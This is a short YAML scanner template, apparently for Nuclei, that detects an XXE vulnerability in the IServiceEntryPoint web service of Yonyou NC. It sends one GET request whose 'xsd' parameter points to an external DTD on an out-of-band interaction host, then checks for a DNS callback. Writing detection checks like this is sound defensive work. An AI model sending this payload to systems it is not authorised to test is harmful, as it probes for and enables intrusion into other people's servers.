id: yongyou-nc-iserviceentrypoint-xxe
info:
  name: "用友 NC IServiceEntryPoint XXE 漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: yongyou-nc
http:
  - raw:
      - |
        GET /uapws/service/nc.uap.oba.word.webservice.IServiceEntryPoint?xsd=http://{{interactsh-url}}/ext.dtd HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
